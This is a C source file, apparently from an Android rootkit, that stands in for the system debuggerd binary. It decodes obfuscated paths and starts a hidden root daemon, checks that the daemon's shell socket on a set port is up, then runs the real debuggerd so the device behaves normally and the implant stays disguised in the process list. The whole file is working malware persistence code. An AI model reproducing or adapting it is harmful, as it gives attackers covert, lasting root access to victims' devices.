#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

#include "shell_params.h"
#include "deobfuscate.h"
#include "ps.h"
#include "runner_bin.h"
#include "log.h"
#include "utils.h"

int check_runner_id(void) {
  FILE *f;
  long fsize;
  char file_mem[256];
  char *data;

  // Open real debuggerd and read it
  f = fopen(deobfuscate(INSTALL_SCRIPT_BAK), "rb");
  fseek(f, 0, SEEK_END);
  fsize = ftell(f);
  fseek(f, 0, SEEK_SET);

  memset(file_mem, 0, sizeof(file_mem));
  data = malloc(fsize + 1);
  fread(data, fsize, 1, f);
  fclose(f);

  // Check if it is our wrapper (runner)
  memcpy(file_mem, (void *) data+(fsize-sizeof(RUNNER_ID)+1), sizeof(RUNNER_ID));
  if(!memcmp(file_mem, RUNNER_ID, sizeof(RUNNER_ID)))
    return 1;

  return 0;
    

}

int main(int argc, char **argv) {
  int i;
  struct stat st;

  if(find_process(deobfuscate(ROOT_BIN_ARG0)) || (stat(deobfuscate(ROOT_BIN), &st) < 0)) {
    // Check if for some reason real debuggerd has been overwritten.
    // We need it to avoid loop
    if(!check_runner_id()) {
      execve(deobfuscate(INSTALL_SCRIPT_BAK), argv, NULL);
      return 0;
    }
    else {
      LOGD("Something is wrong. Real debuggerd is our runner. Skipping to avoid loops!\n");
      return -1;
    }
  }

  // Start our root server 
  if(fork() == 0)
    execl(deobfuscate(ROOT_BIN), deobfuscate(ROOT_BIN_ARG0), deobfuscate(OPT), NULL);

  sleep(5);
  if(check_socket(SHELL_PORT) != 0) {
    LOGD("Socket error\n");

    // We need to kill every spawned daemon otherwise at the runner reboot the root daemon
    // won't start anymore
    kill_root_daemon();
    sleep(1);
    exit(0); // If a file descriptor error occurs we have to restart the daemon process
  }

  // Start the real binary
  if(fork() == 0)
    execl(deobfuscate(INSTALL_SCRIPT_BAK), deobfuscate(INSTALL_SCRIPT_BAK_ARG0), NULL);

  // Keep the process running; we need to keep the process name in the ps list
  while(1) {
    sleep(10);
  }


  return 0;

}
